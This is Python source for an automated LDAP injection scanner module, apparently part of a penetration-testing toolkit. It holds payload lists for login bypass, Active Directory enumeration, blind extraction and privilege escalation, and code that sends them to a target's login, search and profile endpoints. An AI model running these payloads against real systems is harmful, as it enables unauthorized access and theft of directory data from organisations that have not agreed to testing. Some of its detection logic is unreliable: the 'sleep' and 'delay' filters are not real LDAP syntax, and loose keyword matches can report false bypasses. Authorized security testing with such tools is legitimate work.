"""
LDAP Injection Testing Agent
============================

This agent performs comprehensive LDAP injection testing including:
- LDAP authentication bypass
- Directory enumeration attacks
- Information disclosure via LDAP queries
- Blind LDAP injection detection
- LDAP filter manipulation
- Active Directory specific attacks

Author: Nexus Hunter Security Team
Version: 1.0
"""

import asyncio
import aiohttp
import json
import time
import base64
import random
from typing import Dict, List, Any, Optional
from urllib.parse import urljoin, urlparse, quote, unquote
from ..base import BaseAgent
from agents.vulnerability_detection_helper import check_vulnerability_indicators, VULNERABILITY_TYPES


class LDAPInjectionAgent(BaseAgent):
    """Advanced LDAP Injection Vulnerability Testing Agent"""
    
    def __init__(self):
        super().__init__("LDAP Injection Agent")
        self.name = "LDAP Injection Agent"
        self.description = "Enterprise directory service LDAP injection testing"
        self.version = "1.0"
        
        # LDAP injection test categories
        self.test_categories = {
            'authentication_bypass': 'LDAP authentication bypass testing',
            'blind_injection': 'Blind LDAP injection detection',
            'information_disclosure': 'Directory information extraction',
            'filter_manipulation': 'LDAP filter manipulation attacks',
            'enumeration': 'Directory enumeration and reconnaissance',
            'privilege_escalation': 'LDAP privilege escalation testing'
        }
        
        # Common LDAP-related parameters
        self.ldap_params = [
            'username', 'user', 'login', 'uid', 'userid', 'account',
            'password', 'pass', 'pwd', 'auth', 'filter', 'search',
            'query', 'dn', 'distinguishedname', 'cn', 'commonname',
            'ou', 'organizationalunit', 'dc', 'domaincomponent',
            'member', 'memberof', 'group', 'role', 'attribute',
            'ldapquery', 'directory', 'domain', 'ad'
        ]
        
        # LDAP authentication bypass payloads
        self.auth_bypass_payloads = [
            # Basic LDAP injection
            '*', '*)(uid=*', '*)(|(uid=*',
            '*)(&(uid=*', '*))((|(uid=*', '*)(cn=*',
            
            # Authentication bypass with wildcards
            '*)(objectClass=*', '*)(|(objectClass=*',
            '*)(cn=*)(userPassword=*', '*)(sAMAccountName=*',
            
            # Boolean logic manipulation
            '*)((|(objectClass=*', '*)(|(&(objectClass=*',
            '*)((|(cn=*', '*))((|(sAMAccountName=*',
            
            # Null password bypass
            '*)(userPassword=)', '*)(password=',
            '*)(|(userPassword=*)(userPassword=',
            
            # Administrative bypass
            'admin*)((|(cn=*', 'administrator*)((|(uid=*',
            'root*)((|(objectClass=*', 'admin*)(|(cn=*'
        ]
        
        # LDAP filter injection payloads
        self.filter_payloads = [
            # Attribute enumeration
            '(objectClass=*)', '(uid=*)', '(cn=*)',
            '(sAMAccountName=*)', '(mail=*)', '(userPassword=*)',
            '(memberOf=*)', '(description=*)',
            
            # Administrative objects
            '(objectClass=user)', '(objectClass=group)',
            '(objectClass=organizationalUnit)', '(objectClass=domain)',
            '(adminCount=1)', '(isCriticalSystemObject=TRUE)',
            
            # Wildcard searches
            '(|(uid=*)(cn=*))', '(|(sAMAccountName=*)(mail=*))',
            '(&(objectClass=user)(adminCount=1))',
            
            # Time-based payloads (if LDAP supports delays)
            '(|(uid=admin)(sleep(5)))', '(|(cn=admin)(delay(5)))'
        ]
        
        # LDAP information disclosure payloads
        self.info_payloads = [
            # Schema enumeration
            '(objectClass=subschema)', '(objectClass=dMD)',
            '(objectClass=attributeSchema)', '(objectClass=classSchema)',
            
            # System information
            '(objectClass=computer)', '(objectClass=trusteddomain)',
            '(objectClass=configuration)', '(objectClass=site)',
            
            # User enumeration
            '(&(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))',
            '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=512))',
            
            # Group enumeration
            '(&(objectClass=group)(groupType:1.2.840.113556.1.4.803:=2147483648))',
            '(objectClass=organizationalRole)'
        ]

    async def execute(self, target: str, context: Dict = None) -> Dict[str, Any]:
        """Execute comprehensive LDAP injection testing"""
        results = {
            'agent': self.name,
            'version': self.version,
            'target': target,
            'timestamp': time.time(),
            'vulnerabilities': [],
            'findings': {},
            'directory_info': {},
            'risk_score': 0,
            'test_summary': {}
        }
        
        try:
            async with aiohttp.ClientSession(
                timeout=aiohttp.ClientTimeout(total=30),
                connector=aiohttp.TCPConnector(limit=10)
            ) as session:
                
                # 1. LDAP Authentication Bypass Testing
                await self._test_authentication_bypass(session, target, results)
                await asyncio.sleep(1)
                
                # 2. LDAP Filter Injection Testing
                await self._test_filter_injection(session, target, results)
                await asyncio.sleep(1)
                
                # 3. Information Disclosure Testing
                await self._test_information_disclosure(session, target, results)
                await asyncio.sleep(1)
                
                # 4. Blind LDAP Injection Testing
                await self._test_blind_injection(session, target, results)
                await asyncio.sleep(1)
                
                # 5. Directory Enumeration Testing
                await self._test_directory_enumeration(session, target, results)
                await asyncio.sleep(1)
                
                # 6. Privilege Escalation Testing
                await self._test_privilege_escalation(session, target, results)
                
        except Exception as e:
            results['error'] = f"LDAP injection testing failed: {str(e)}"
            results['success'] = False
            return results
        
        # Calculate final risk score
        results['risk_score'] = self._calculate_risk_score(results)
        results['success'] = True
        
        return results

    async def _test_authentication_bypass(self, session: aiohttp.ClientSession, target: str, results: Dict) -> None:
        """Test LDAP authentication bypass vulnerabilities"""
        findings = []
        
        # Test on login/auth endpoints
        auth_endpoints = [
            '/login', '/auth', '/authenticate', '/signin', '/ldap',
            '/api/login', '/api/auth', '/api/authenticate',
            '/admin/login', '/portal/login', '/sso'
        ]
        
        for endpoint in auth_endpoints:
            test_url = urljoin(target, endpoint)
            
            for payload in self.auth_bypass_payloads:
                # Test as username with empty/any password
                auth_data = {
                    'username': payload,
                    'password': 'test'
                }
                
                try:
                    async with session.post(
                        test_url,
                        data=auth_data,
                        allow_redirects=False
                    ) as response:
                        response_text = await response.text()
                        
                        # CRITICAL FIX: Check for explicit vulnerability indicators first
                        try:
                            import json as json_module
                            json_data = json_module.loads(response_text)
                            
                            if isinstance(json_data, dict):
                                if json_data.get('payloadDetected') or json_data.get('injectionDetected'):
                                    findings.append({
                                        'type': 'LDAP Injection',
                                        'severity': 'CRITICAL',
                                        'endpoint': test_url,
                                        'parameter': 'username',
                                        'payload': payload,
                                        'evidence': f"Target confirmed: {json_data}",
                                        'impact': 'LDAP injection detected',
                                        'cwe': 'CWE-90'
                                    })
                                    continue
                                
                                if 'vulnerability' in json_data and 'ldap' in str(json_data.get('vulnerability', '')).lower():
                                    findings.append({
                                        'type': 'LDAP Injection',
                                        'severity': 'CRITICAL',
                                        'endpoint': test_url,
                                        'parameter': 'username',
                                        'payload': payload,
                                        'evidence': f"Vulnerability: {json_data.get('vulnerability')}",
                                        'impact': 'LDAP injection detected',
                                        'cwe': 'CWE-90'
                                    })
                                    continue
                        except:
                            pass
                        
                        # Check for successful authentication indicators
                        success_indicators = [
                            'welcome', 'dashboard', 'profile', 'authenticated',
                            'logged in', 'login successful', 'authentication successful',
                            'token', 'session', 'redirect', 'home'
                        ]
                        
                        # Check response status and content
                        if (response.status in [200, 302, 303, 307] and 
                            any(indicator in response_text.lower() for indicator in success_indicators)):
                            
                            findings.append({
                                'type': 'LDAP Authentication Bypass',
                                'severity': 'CRITICAL',
                                'endpoint': test_url,
                                'parameter': 'username',
                                'payload': payload,
                                'evidence': f"Auth bypass: Status {response.status}, Response: {response_text[:200]}",
                                'impact': 'Complete authentication bypass via LDAP injection',
                                'cwe': 'CWE-90'
                            })
                        
                        # Check for LDAP error messages that confirm injection
                        ldap_errors = [
                            'ldap', 'invalid dn', 'malformed filter',
                            'bad search filter', 'ldap_search', 'directory service',
                            'active directory', 'distinguished name'
                        ]
                        
                        if any(error in response_text.lower() for error in ldap_errors):
                            findings.append({
                                'type': 'LDAP Injection Error Disclosure',
                                'severity': 'MEDIUM',
                                'endpoint': test_url,
                                'parameter': 'username',
                                'payload': payload,
                                'evidence': f"LDAP error disclosed: {response_text[:300]}",
                                'impact': 'LDAP backend confirmed, potential for further exploitation',
                                'cwe': 'CWE-209'
                            })
                    
                    await asyncio.sleep(0.5)  # Rate limiting
                    
                except Exception:
                    continue
                
                # Also test with payload in password field
                auth_data_pwd = {
                    'username': 'admin',
                    'password': payload
                }
                
                try:
                    async with session.post(test_url, data=auth_data_pwd) as response:
                        response_text = await response.text()
                        
                        if (response.status in [200, 302] and 
                            any(indicator in response_text.lower() for indicator in success_indicators)):
                            
                            findings.append({
                                'type': 'LDAP Password Field Injection',
                                'severity': 'CRITICAL',
                                'endpoint': test_url,
                                'parameter': 'password',
                                'payload': payload,
                                'evidence': f"Password field injection: {response_text[:200]}",
                                'impact': 'Authentication bypass via password field LDAP injection',
                                'cwe': 'CWE-90'
                            })
                    
                    await asyncio.sleep(0.5)
                    
                except Exception:
                    continue
        
        results['findings']['authentication_bypass'] = findings
        results['test_summary']['authentication_bypass'] = len(findings)

    async def _test_filter_injection(self, session: aiohttp.ClientSession, target: str, results: Dict) -> None:
        """Test LDAP filter injection vulnerabilities"""
        findings = []
        
        # Test on search and filter endpoints
        search_endpoints = [
            '/search', '/find', '/lookup', '/directory', '/users',
            '/api/search', '/api/users', '/api/directory',
            '/admin/users', '/portal/search'
        ]
        
        for endpoint in search_endpoints:
            test_url = urljoin(target, endpoint)
            
            for payload in self.filter_payloads:
                # Test as GET parameter
                for param in self.ldap_params[:10]:  # Limit for performance
                    get_url = f"{test_url}?{param}={quote(payload)}"
                    
                    try:
                        async with session.get(get_url) as response:
                            response_text = await response.text()
                            
                            # Check for LDAP data indicators
                            ldap_data_indicators = [
                                'dn:', 'cn=', 'uid=', 'ou=', 'dc=',
                                'objectclass', 'distinguished name',
                                'organizational unit', 'common name',
                                'user principal name', 'sam account name'
                            ]
                            
                            # Look for multiple user/directory entries
                            entry_count = response_text.lower().count('cn=') + response_text.lower().count('uid=')
                            
                            if (entry_count > 1 or 
                                any(indicator in response_text.lower() for indicator in ldap_data_indicators)):
                                
                                findings.append({
                                    'type': 'LDAP Filter Injection',
                                    'severity': 'HIGH',
                                    'endpoint': get_url,
                                    'parameter': param,
                                    'payload': payload,
                                    'evidence': f"LDAP data exposed: {entry_count} entries, Response: {response_text[:300]}",
                                    'impact': 'Directory information disclosure via filter injection',
                                    'cwe': 'CWE-90'
                                })
                        
                        await asyncio.sleep(0.3)
                        
                    except Exception:
                        continue
                
                # Test as POST data
                try:
                    post_data = {'filter': payload, 'search': payload, 'query': payload}
                    async with session.post(test_url, data=post_data) as response:
                        response_text = await response.text()
                        
                        entry_count = response_text.lower().count('cn=') + response_text.lower().count('uid=')
                        
                        if entry_count > 1:
                            findings.append({
                                'type': 'LDAP Filter Injection (POST)',
                                'severity': 'HIGH',
                                'endpoint': test_url,
                                'payload': payload,
                                'method': 'POST',
                                'evidence': f"LDAP entries exposed: {entry_count}",
                                'impact': 'Directory enumeration via POST filter injection',
                                'cwe': 'CWE-90'
                            })
                    
                    await asyncio.sleep(0.5)
                    
                except Exception:
                    continue
        
        results['findings']['filter_manipulation'] = findings
        results['test_summary']['filter_manipulation'] = len(findings)

    async def _test_information_disclosure(self, session: aiohttp.ClientSession, target: str, results: Dict) -> None:
        """Test LDAP information disclosure vulnerabilities"""
        findings = []
        directory_info = {}
        
        for payload in self.info_payloads:
            for param in ['search', 'filter', 'query', 'ldap']:
                test_url = f"{target}?{param}={quote(payload)}"
                
                try:
                    async with session.get(test_url) as response:
                        response_text = await response.text()
                        
                        # Check for schema information
                        schema_indicators = [
                            'attributeschema', 'classschema', 'subschema',
                            'objectclasses', 'attributetypes', 'ldapschema'
                        ]
                        
                        if any(indicator in response_text.lower() for indicator in schema_indicators):
                            findings.append({
                                'type': 'LDAP Schema Information Disclosure',
                                'severity': 'MEDIUM',
                                'endpoint': test_url,
                                'parameter': param,
                                'payload': payload,
                                'evidence': f"Schema information exposed: {response_text[:400]}",
                                'impact': 'Directory schema structure disclosure',
                                'cwe': 'CWE-200'
                            })
                            
                            # Extract schema information
                            directory_info['schema_exposed'] = True
                        
                        # Check for user information
                        user_indicators = [
                            'useraccountcontrol', 'samaccountname', 'userprincipalname',
                            'givenname', 'surname', 'mail', 'telephonenumber'
                        ]
                        
                        user_count = sum(response_text.lower().count(indicator) for indicator in user_indicators)
                        
                        if user_count > 2:
                            findings.append({
                                'type': 'LDAP User Information Disclosure',
                                'severity': 'HIGH',
                                'endpoint': test_url,
                                'parameter': param,
                                'payload': payload,
                                'evidence': f"User information exposed: {user_count} attributes found",
                                'impact': 'Sensitive user directory information disclosure',
                                'cwe': 'CWE-200'
                            })
                            
                            # Extract user info count
                            directory_info['users_exposed'] = user_count
                        
                        # Check for administrative information
                        admin_indicators = [
                            'admincount=1', 'iscriticalsystemobject=true',
                            'domain admins', 'enterprise admins', 'administrators'
                        ]
                        
                        if any(indicator in response_text.lower() for indicator in admin_indicators):
                            findings.append({
                                'type': 'LDAP Administrative Information Disclosure',
                                'severity': 'CRITICAL',
                                'endpoint': test_url,
                                'parameter': param,
                                'payload': payload,
                                'evidence': f"Administrative information exposed: {response_text[:300]}",
                                'impact': 'Critical administrative directory information disclosure',
                                'cwe': 'CWE-200'
                            })
                            
                            directory_info['admin_info_exposed'] = True
                    
                    await asyncio.sleep(0.3)
                    
                except Exception:
                    continue
        
        results['directory_info'] = directory_info
        results['findings']['information_disclosure'] = findings
        results['test_summary']['information_disclosure'] = len(findings)

    async def _test_blind_injection(self, session: aiohttp.ClientSession, target: str, results: Dict) -> None:
        """Test blind LDAP injection vulnerabilities"""
        findings = []
        
        # Blind LDAP injection payloads using boolean logic
        blind_payloads = [
            # True conditions
            '*)(&(objectClass=*)(objectClass=*',  # Always true
            '*)(&(cn=*)(uid=*',  # Likely true
            
            # False conditions  
            '*)(&(objectClass=nonexistent)(cn=*',  # Always false
            '*)(&(uid=impossible123)(cn=*',  # Likely false
            
            # Character-by-character extraction
            '*)(&(cn=a*)(objectClass=*',  # First char is 'a'
            '*)(&(cn=b*)(objectClass=*',  # First char is 'b'
            '*)(&(cn=admin*)(objectClass=*',  # Starts with 'admin'
        ]
        
        # Test blind injection patterns
        for param in ['username', 'user', 'search', 'filter']:
            true_payload = '*)(&(objectClass=*)(objectClass=*'
            false_payload = '*)(&(objectClass=nonexistent)(cn=*'
            normal_payload = 'normaluser'
            
            try:
                # Get baseline response
                baseline_url = f"{target}?{param}={quote(normal_payload)}"
                async with session.get(baseline_url) as baseline_response:
                    baseline_text = await baseline_response.text()
                    baseline_length = len(baseline_text)
                    baseline_status = baseline_response.status
                
                # Test true condition
                true_url = f"{target}?{param}={quote(true_payload)}"
                async with session.get(true_url) as true_response:
                    true_text = await true_response.text()
                    true_length = len(true_text)
                    true_status = true_response.status
                
                # Test false condition
                false_url = f"{target}?{param}={quote(false_payload)}"
                async with session.get(false_url) as false_response:
                    false_text = await false_response.text()
                    false_length = len(false_text)
                    false_status = false_response.status
                
                # Analyze response differences
                true_diff = abs(true_length - baseline_length)
                false_diff = abs(false_length - baseline_length)
                
                # If true/false conditions produce different responses
                if (abs(true_length - false_length) > 10 or 
                    true_status != false_status):
                    
                    findings.append({
                        'type': 'Blind LDAP Injection',
                        'severity': 'HIGH',
                        'endpoint': f"{target}?{param}=PAYLOAD",
                        'parameter': param,
                        'evidence': f"Response diff: True={true_length}, False={false_length}, Baseline={baseline_length}",
                        'impact': 'Blind LDAP injection allows information extraction',
                        'cwe': 'CWE-90'
                    })
                
                await asyncio.sleep(0.5)
                
            except Exception:
                continue
        
        results['findings']['blind_injection'] = findings
        results['test_summary']['blind_injection'] = len(findings)

    async def _test_directory_enumeration(self, session: aiohttp.ClientSession, target: str, results: Dict) -> None:
        """Test LDAP directory enumeration capabilities"""
        findings = []
        
        # Directory enumeration payloads
        enum_payloads = [
            # Organizational units
            '(objectClass=organizationalUnit)',
            '(ou=*)',
            
            # All users
            '(&(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))',
            
            # All groups  
            '(objectClass=group)',
            '(objectClass=groupOfNames)',
            
            # Computers/systems
            '(objectClass=computer)',
            '(objectClass=device)',
            
            # Applications and services
            '(objectClass=serviceConnectionPoint)',
            '(objectClass=application)'
        ]
        
        for payload in enum_payloads:
            for param in ['search', 'filter', 'query']:
                test_url = f"{target}?{param}={quote(payload)}"
                
                try:
                    async with session.get(test_url) as response:
                        response_text = await response.text()
                        
                        # Count directory entries
                        entry_indicators = ['dn:', 'cn=', 'uid=', 'ou=']
                        total_entries = sum(response_text.count(indicator) for indicator in entry_indicators)
                        
                        if total_entries > 5:  # Multiple directory entries found
                            findings.append({
                                'type': 'LDAP Directory Enumeration',
                                'severity': 'MEDIUM',
                                'endpoint': test_url,
                                'parameter': param,
                                'payload': payload,
                                'evidence': f"Directory enumeration successful: {total_entries} entries found",
                                'impact': 'Complete directory structure enumeration possible',
                                'cwe': 'CWE-200'
                            })
                            
                            # Check for sensitive organizational info
                            if any(sensitive in response_text.lower() for sensitive in 
                                  ['admin', 'manager', 'executive', 'finance', 'hr']):
                                findings.append({
                                    'type': 'Sensitive Organizational Data Exposure',
                                    'severity': 'HIGH',
                                    'endpoint': test_url,
                                    'parameter': param,
                                    'payload': payload,
                                    'evidence': 'Sensitive organizational structure exposed',
                                    'impact': 'Business-critical organizational information disclosure',
                                    'cwe': 'CWE-200'
                                })
                    
                    await asyncio.sleep(0.5)
                    
                except Exception:
                    continue
        
        results['findings']['enumeration'] = findings
        results['test_summary']['enumeration'] = len(findings)

    async def _test_privilege_escalation(self, session: aiohttp.ClientSession, target: str, results: Dict) -> None:
        """Test LDAP privilege escalation vulnerabilities"""
        findings = []
        
        # Privilege escalation payloads
        privesc_payloads = [
            # Administrative group membership
            '*)(&(memberOf=*admin*)(objectClass=*',
            '*)(&(memberOf=*administrator*)(objectClass=*',
            '*)(&(memberOf=CN=Domain Admins*)(objectClass=*',
            
            # Privilege attribute manipulation
            '*)(&(adminCount=1)(objectClass=*',
            '*)(&(userAccountControl=*)(adminCount=1*',
            
            # Service account targeting
            '*)(&(servicePrincipalName=*)(objectClass=*',
            '*)(&(sAMAccountName=*service*)(objectClass=*'
        ]
        
        # Test on user profile/admin endpoints
        profile_endpoints = [
            '/profile', '/user', '/account', '/admin/user',
            '/api/profile', '/api/user', '/api/account'
        ]
        
        for endpoint in profile_endpoints:
            test_url = urljoin(target, endpoint)
            
            for payload in privesc_payloads:
                try:
                    # Test as parameter
                    param_url = f"{test_url}?user={quote(payload)}"
                    async with session.get(param_url) as response:
                        response_text = await response.text()
                        
                        # Check for privilege indicators
                        privilege_indicators = [
                            'domain admin', 'administrator', 'admin group',
                            'elevated privilege', 'administrative access',
                            'serviceprincipalname', 'admincount=1'
                        ]
                        
                        if any(indicator in response_text.lower() for indicator in privilege_indicators):
                            findings.append({
                                'type': 'LDAP Privilege Escalation',
                                'severity': 'CRITICAL',
                                'endpoint': param_url,
                                'payload': payload,
                                'evidence': f"Privilege escalation successful: {response_text[:300]}",
                                'impact': 'Administrative privilege access via LDAP injection',
                                'cwe': 'CWE-269'
                            })
                    
                    # Test as POST data
                    post_data = {'username': payload, 'user': payload}
                    async with session.post(test_url, data=post_data) as response:
                        response_text = await response.text()
                        
                        if any(indicator in response_text.lower() for indicator in privilege_indicators):
                            findings.append({
                                'type': 'LDAP Privilege Escalation (POST)',
                                'severity': 'CRITICAL',
                                'endpoint': test_url,
                                'payload': payload,
                                'method': 'POST',
                                'evidence': 'Administrative access granted via LDAP injection',
                                'impact': 'Critical privilege escalation vulnerability',
                                'cwe': 'CWE-269'
                            })
                    
                    await asyncio.sleep(0.5)
                    
                except Exception:
                    continue
        
        results['findings']['privilege_escalation'] = findings
        results['test_summary']['privilege_escalation'] = len(findings)

    def _calculate_risk_score(self, results: Dict) -> int:
        """Calculate overall risk score based on findings"""
        score = 0
        severity_weights = {'CRITICAL': 10, 'HIGH': 7, 'MEDIUM': 4, 'LOW': 2}
        
        for category, findings in results.get('findings', {}).items():
            for finding in findings:
                severity = finding.get('severity', 'LOW')
                score += severity_weights.get(severity, 2)
        
        # Bonus for directory information exposed
        if results.get('directory_info', {}).get('admin_info_exposed'):
            score += 15
        if results.get('directory_info', {}).get('schema_exposed'):
            score += 10
        
        # Compile all vulnerabilities
        results['vulnerabilities'] = []
        for category, findings in results.get('findings', {}).items():
            results['vulnerabilities'].extend(findings)
        
        # Count critical vulnerabilities
        critical_count = sum(1 for vuln in results['vulnerabilities'] 
                           if vuln.get('severity') == 'CRITICAL')
        results['critical_vulnerabilities'] = critical_count
        
        return min(score, 100)  # Cap at 100

    def get_info(self) -> Dict[str, Any]:
        """Return agent information"""
        return {
            'name': self.name,
            'description': self.description,
            'version': self.version,
            'categories': list(self.test_categories.keys()),
            'test_types': [
                'LDAP Authentication Bypass',
                'LDAP Filter Injection',
                'Directory Information Disclosure',
                'Blind LDAP Injection',
                'Directory Enumeration',
                'LDAP Privilege Escalation',
                'Schema Information Extraction',
                'Active Directory Testing'
            ],
            'target_environments': ['Active Directory', 'OpenLDAP', 'Enterprise Directory Services'],
            'severity_levels': ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW']
        }

